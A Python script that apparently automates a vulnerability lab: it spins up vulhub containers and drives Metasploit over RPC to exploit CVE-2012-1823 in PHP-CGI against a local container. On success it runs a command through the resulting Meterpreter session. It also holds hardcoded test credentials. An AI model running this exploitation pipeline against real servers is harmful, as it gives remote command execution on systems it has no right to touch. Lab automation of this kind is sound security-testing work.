from VmManage import VmManage
from DockerManage import *
from metasploit import metasploit
import re, time, os
import configparser

if __name__ == '__main__':

    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.ini'))
    except:
        raise Exception("Dismiss config.ini")

    ESXi_ip = config["ESXi"]['ip']
    ESXi_port = config["ESXi"]['port']
    ESXi_user = config["ESXi"]['user']
    ESXi_pass = config["ESXi"]['pass']

    Metasploit_ip = config["Metasploit"]['ip']
    Metasploit_port = config["Metasploit"]['port']
    Metasploit_user = config["Metasploit"]['user']
    Metasploit_pass = config["Metasploit"]['pass']


    vm = VmManage(host=ESXi_ip,
                  user=ESXi_user,
                  password=ESXi_pass,
                  port=ESXi_port)
    
    # 1. 


    # vm.create_vm_from_ova('./Noob.ova')
    # vm.vm_power_on("Noob")
    # ip = vm.get_vm_ip("Noob")
    # print(ip)


    # vm.vm_power_off("Noob")
    # vm.destroy_vm("Noob")

    # 2. 

    # image_name = parse_yml('php','CVE-2012-1823')
    # print(image_name)

    # docker_compose_up_build('php', 'CVE-2012-1823')
    # x = get_container_by_images('vulhub/php:5.4.1-cgi')
    # ip = get_container_ip(x)
    # print(ip)

    # destroy_container('php', 'CVE-2012-1823')
    # rm_images('vulhub/php:5.4.1-cgi')


    # 3. attack 
    
    # load msgrpc ServerHost=192.168.71.131 ServerPort=55553 User=user Pass='pass123'

    # docs for msf rpc api :   
    # https://help.rapid7.com/metasploit/Content/api/rpc/standard-reference.html?Highlight=console
    
    x = metasploit('192.168.71.131', 55553)
    x.login('user','pass123')
    x.get_console()

    # x.call('console.write', [x.console_id, 'search CVE-2012-1823\n'])
    # x.call('console.read', [x.console_id])

    text = x.send_command(x.console_id, "search CVE-2012-1823\n", False)
    print("search finished")
    
    try:
        pattern = r'exploit/[^ ]+'
        exploit = re.findall(pattern, text)[0] # 仅考虑 use 0
        x.send_command(x.console_id, "use " + exploit + '\n', False)
    except:
        raise Exception("can not find exploit")
    print("Using ::" + exploit)
    
    # get options

    option = x.get_module_options('exploit', exploit)
    print("raw options:" + str(option) + "\n\n")

    # set options
    option = x.set_module_options('172.18.0.2', 80, option)

    print("specify options: " + str(option) + '\n\n')

    # execute exploits
    job_id, uuid = x.execute_module(exploit, option)

    if uuid is not None:
        # Check status of running module.
        x.check_running_module(job_id, uuid)
        sessions = x.call('session.list', [])
        key_list = sessions.keys()
        if len(key_list) != 0:
            # Probably successfully of exploitation (but unsettled).
            for key in key_list:
                exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                if uuid == exploit_uuid:
                    # Successfully of exploitation.
                    session_id = int(key)
                    print("session conn succeess !! id is " + str(session_id))
                    x.call('session.meterpreter_write', [session_id, "ls\n"])
                    for i in range(0,30):
                        res = x.call('session.meterpreter_read', [session_id])
                        if res[b'data'] != b'':
                            print(res)
                            x.call('session.stop', [session_id])
                            break
                        time.sleep(1)
                    else:
                        raise Exception("command timeout")
    x.logout()
    

    


























